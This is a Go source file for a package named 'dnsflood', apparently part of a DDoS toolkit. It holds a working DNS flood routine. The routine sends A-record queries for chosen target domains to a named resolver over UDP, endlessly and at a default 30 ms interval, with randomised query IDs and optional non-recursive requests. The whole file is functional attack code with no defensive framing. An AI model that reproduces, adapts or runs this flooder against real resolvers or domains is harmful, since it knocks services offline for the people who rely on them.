package dnsflood

import (
	"github.com/Arriven/db1000n/src/logs"
	"github.com/miekg/dns"
	"math/big"
	"math/rand"
	"net"
	"time"
)

type Config struct {
	Verbose       bool
	Iterative     bool
	Resolver      string
	TargetDomains []string
	IntervalMs    int
}
type DnsStress struct {
	Logger *logs.Logger
	Config *Config
}

func setDefaults(c *Config) {
	if c.IntervalMs == 0 {
		c.IntervalMs = 30
	}
	// all remaining parameters are treated as domains to be used in round-robin in the threads
	for i, element := range c.TargetDomains {
		if element[len(element)-1] != '.' {
			c.TargetDomains[i] = element + "."
		}
	}
}

func Start(stopChan chan bool, logger *logs.Logger, config *Config) error {
	setDefaults(config)
	s := &DnsStress{
		Logger: logger,
		Config: config,
	}

	parsedResolver, err := ParseIPPort(config.Resolver)
	config.Resolver = parsedResolver
	if err != nil {
		s.Logger.Error("Unable to parse the resolver address", err)
		return err
	}

	logger.Info("Stressing resolver: %s.", config.Resolver)
	logger.Info("Target domains: %v.", config.TargetDomains)

	go s.linearResolver(stopChan, config.TargetDomains, config.IntervalMs)

	return nil
}

func (s DnsStress) linearResolver(stopChan chan bool, domains []string, intervalMs int) {
	maxRequestID := big.NewInt(65536)

	messages := make([]*dns.Msg, len(domains))
	for i, d := range domains {
		message := new(dns.Msg).SetQuestion(d, dns.TypeA)
		if s.Config.Iterative {
			message.RecursionDesired = false
		}
		messages[i] = message
	}

	for {
		select {
		case <-stopChan:
			return
		default:
			sendMessages(s.Config.Resolver, messages, maxRequestID)
		}
		time.Sleep(time.Duration(intervalMs) * time.Millisecond)
	}
}

func sendMessages(resolver string, messages []*dns.Msg, maxRequestID *big.Int) {
	dnsConn, _ := net.Dial("udp", resolver)
	co := &dns.Conn{Conn: dnsConn}
	for _, message := range messages {
		newId := rand.Intn(65536)
		message.Id = uint16(newId)
		_ = co.WriteMsg(message)

	}
	defer co.Close()
}

// ParseIPPort returns a valid string that can be passed to net.Dial, containing both the IP
// address and the port number.
func ParseIPPort(input string) (string, error) {
	if ip := net.ParseIP(input); ip != nil {
		// A "pure" IP was passed, with no port number (or name)
		return net.JoinHostPort(ip.String(), "53"), nil
	}
	// Input has both address and port
	host, port, err := net.SplitHostPort(input)
	if err != nil {
		return input, err
	}
	return net.JoinHostPort(host, port), nil
}
